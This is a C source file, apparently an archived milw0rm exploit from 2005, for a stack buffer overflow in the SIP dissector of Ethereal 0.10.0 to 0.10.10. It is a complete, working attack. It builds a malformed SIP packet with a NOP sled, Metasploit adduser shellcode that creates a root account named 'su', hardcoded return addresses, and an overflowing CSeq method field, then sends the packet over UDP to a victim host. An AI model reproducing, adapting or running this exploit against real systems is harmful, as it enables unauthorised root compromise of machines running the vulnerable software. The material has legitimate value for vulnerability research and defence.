/* tethereal_sip.c (now quite functional)
*
* Ethereal (0.10.0 to 0.10.10) SIP Dissector remote root exploit
*
* Advisory: 
* http://www.ethereal.com/appnotes/enpa-sa-00019.html
* 
* produced by Team W00dp3ck3r:
* frauk\x41iser
* mag00n
* s00n
* thorben
* 
* Notes:
* tested on Debian Sarge 
* Linux maggot4 2.6.8-1-386 #1 Mon Sep 13 23:29:55 EDT 2004 i686 GNU/Linux
*
* tested version of ethereal:
* http://www.ethereal.com/distribution/all-versions/ethereal-0.10.10.tar.gz
* (./configure, make, make install ;))
* 
* victim has to switch from normal user to root using "su -" 
* the exploit adds a user named "su" with password "su" on the victim host
* 
*/


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>


unsigned char sip_header[] = 
"\x4f\x50\x54\x49\x4f\x4e\x53\x20\x73\x69\x70\x3a\x68\x61\x63"
"\x6b\x20\x53\x49\x50\x2f\x32\x2e\x30\x0a\x56\x69\x61\x3a\x20"
"\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x63\x70\x63"
"\x31\x2d\x6d\x61\x72\x73\x31\x2d\x33\x2d\x30\x2d\x63\x75\x73"
"\x74\x32\x32\x35\x2e\x6d\x69\x64\x64\x2e\x63\x61\x62\x6c\x65"
"\x2e\x6e\x74\x6c\x2e\x63\x6f\x6d\x3a\x35\x35\x31\x31\x38\x3b"
"\x72\x70\x6f\x72\x74\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50"
"\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x68\x61\x63\x6b\x3a\x39"
"\x0a\x46\x72\x6f\x6d\x3a\x20\x73\x69\x70\x3a\x68\x61\x63\x6b"
"\x3b\x74\x61\x67\x3d\x36\x31\x35\x61\x65\x37\x37\x30\x0a\x54"
"\x6f\x3a\x20\x73\x69\x70\x3a\x68\x61\x63\x6b";

unsigned char callid[] =
"\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20";


/* adduser shellcode, user: "su", pwd: "su" Full Size=116, splitted into 
2 parts because one buffer was too small. thx to http://metasploit.com */
unsigned char shellcode[] =
"\x31\xc9\x83\xe9\xe9\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa5"
"\xb7\x95\xbb\x83\xeb\xfc\xe2\xf4\x94\x7e\x1c\x70\xcf\xf1\xcd\x76"
"\x25\xdd\x90\xe3\x94\x7e\xc4\xd3\xd6\xc4\xe2\xdf\xcd\x98\xba\xcb"
"\xc4\xdf\xba\xde\xd1\xd4\x1c\x58\xe4\x02\x91\x76\x25\x24\x7d\x9b"
"\xa5\xb7\x95\xc8\xd0\x8d\xd4\xfa\xdf\xf2\xac\xd4\xd4\xf9\xdd\xed"
"\xf5\x82\xe6\x81\x95\x8d\xa5\x81\x9f\x98\xaf\x94\xc7\xde\xfb\x94"
"\xd6\xdf\x9f\xe2\x2e\xe6";


unsigned char cseq[] = 
"\x0a\x43\x53\x65\x71\x3a\x20";

/* the malformed cseq method field. the buffer has a size of 16 byte. you need 
48 byte to overwrite the return address. the first byte is checked isalpha(), 
so we splitted the shellcode in a way that the first char of cseq_method passes
the isalpha() check. */ 
unsigned char cseq_method[] = 
"\x69\xd1\xa1\xef\x58\x3b\xcf\xb6\xcd\x76\x25\xb7\x95\xbb";


/* needed to be a fully valid sip packet */
unsigned char sip_footer[] =
"\x0a\x43\x6f\x6e\x74\x61\x63\x74\x3a\x20\x68\x61\x63\x6b\x3a"
"\x39\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74"
"\x68\x3a\x20\x30\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72"
"\x64\x73\x3a\x20\x37\x30\x0a\x55\x73\x65\x72\x2d\x41\x67\x65"
"\x6e\x74\x3a\x20\x57\x30\x30\x64\x70\x33\x63\x6b\x33\x72\x20"
"\x0a";



int main(int argc, char * argv[]) {
unsigned int i, offset, ret, p_addr;
struct sockaddr_in dest;
struct hostent *he;
int sock, slen = sizeof(struct sockaddr);
unsigned char buffer[2048];

// help output
if(argc < 3) {
printf("correct syntax: %s <flag> <host> \n", argv[0]);
printf("possible flag: \n");
printf("1 the ethereal user has started tethereal" 
"with full path as root \n");
printf("2 the ethereal user has started tethereal" 
"without directorypath as root \n");
return 1;
}

// p_addr may differ on other systems ;)
if (argv[1][0] == '1') {
p_addr = 0xbffee328;
}

if (argv[1][0] == '2') {
p_addr = 0xbffee338;
}

// destination-ip check
if((he = gethostbyname(argv[2])) == NULL) {
printf("[!] Couldn't resolve %s\n", argv[2]);
return 1;
}

// open socket
if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
perror("socket()");
return 1;
}

// set packet parameters
dest.sin_port = htons(5060);
dest.sin_family = AF_INET;
dest.sin_addr = *((struct in_addr *)he->h_addr);

// set the returnaddress (may differ on other systems)
ret = 0xbffee240; 


//// generate a buffer containing the data ////
offset = 0;

// set all values of the buffer to 0x0
memset(buffer, 0x0, sizeof(buffer));

// copy the header into the buffer
memcpy(buffer+offset, sip_header, sizeof(sip_header)); 
offset += sizeof(sip_header) -1;

// concat the callid into the buffer
memcpy(buffer+offset, callid, sizeof(callid)); 
offset += sizeof(callid) -1;

// add the callid-value (nop+shellcode)
i = 128 - sizeof(shellcode) +1; 
memset(buffer+offset, 0x90, i);
offset += i;

// insert shellcode into buffer
memcpy(buffer+offset, shellcode, sizeof(shellcode));
offset += sizeof(shellcode) -1; 


// concat the cseq
memcpy(buffer+offset, cseq, sizeof(cseq)); 
offset += sizeof(cseq) -1;

// generate the part, which causes the overflow (=cseq-method)
memcpy(buffer+offset, cseq_method, sizeof(cseq_method)); 
offset += sizeof(cseq_method) -1; 

// fill the rest of cseq_method with A
memset(buffer+offset, 0x41, 30);
offset += 30; 
// write return address
*(long *)&buffer[offset] = ret; 
offset += 4;

// repair the first pointer after ret- address
*(long *)&buffer[offset] = 0x08215184; // is a pointer DEST-value: 0x1
offset += 4;
// repair second pointer after ret- address 
*(long *)&buffer[offset] = p_addr;
offset += 4; 

// the finalising part of the message
memcpy(buffer+offset, sip_footer, sizeof(sip_footer)); 

// send the buffer to the victim
if (sendto(sock, buffer, sizeof(buffer), 0, 
(struct sockaddr *)&dest, slen)== -1) {
printf("[!] Error sending packet!\n");
return 1;
}

// DEBUG //
// printf("%s\n", buffer);

printf("[*] dark W00dp3ck3r packet sent!\n");
close(sock);
return 0;

}

// milw0rm.com [2005-05-31]
